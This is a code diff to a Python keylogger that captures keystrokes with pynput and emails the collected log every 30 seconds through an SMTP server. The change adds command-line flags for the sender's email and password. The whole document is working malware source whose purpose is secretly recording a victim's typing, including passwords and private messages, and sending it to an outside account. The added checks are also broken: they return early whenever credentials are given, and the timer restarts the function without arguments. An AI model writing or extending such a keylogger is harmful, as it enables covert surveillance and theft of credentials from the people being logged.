@@ -1,6 +1,7 @@
 import pynput.keyboard 
 import smtplib
 import threading
+import optparse
 
 log = ""
 def callback_function(key):
@@ -25,15 +26,30 @@ def send_email(email,password,message):
     email_server.quit()
 
 
-def thread_function():
+def thread_function(email,password):
     global log
-    send_email("email@gmail.com","password",log.encode("utf-8"))
+    if not email:
+        print("Enter email address with -e flag")
+    else:
+        return
+    if not password:
+        print("Enter password with -p flag") 
+    else:
+        return
+    send_email(email,password,log.encode("utf-8"))
     log = ""
     timer_obj = threading.Timer(30,thread_function)
     timer_obj.start()
 
+def get_input():
+    parse_obj = optparse.OptionParser()
+    parse_obj.add_option("-e","--email",dest="email",help="Enter email address")
+    parse_obj.add_option("-p","--password",dest="password",help="Enter password")
+    return parse_obj.parse_args()
+        
+user_input = get_input()[0]
 keylogger = pynput.keyboard.Listener(on_press=callback_function)
 # threading
 with keylogger:
-    thread_function()
+    thread_function(user_input.email,user_input.password)
     keylogger.join()
